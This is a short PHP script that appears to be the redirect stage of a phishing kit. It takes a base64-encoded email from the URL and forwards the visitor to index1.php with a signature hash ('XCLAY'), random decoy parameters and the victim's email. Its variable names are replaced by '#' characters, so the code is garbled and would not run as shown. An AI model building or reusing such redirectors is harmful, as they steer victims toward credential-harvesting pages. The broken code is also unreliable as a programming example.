<?php

if(isset($_GET['email']) && !empty($_GET['email'])){
# = $_GET['email'];
#=base64_decode(#);

header("Location: index1.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".#);
}else{
header("Location: index1.php?websrc=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."&email=".#);
}

?>
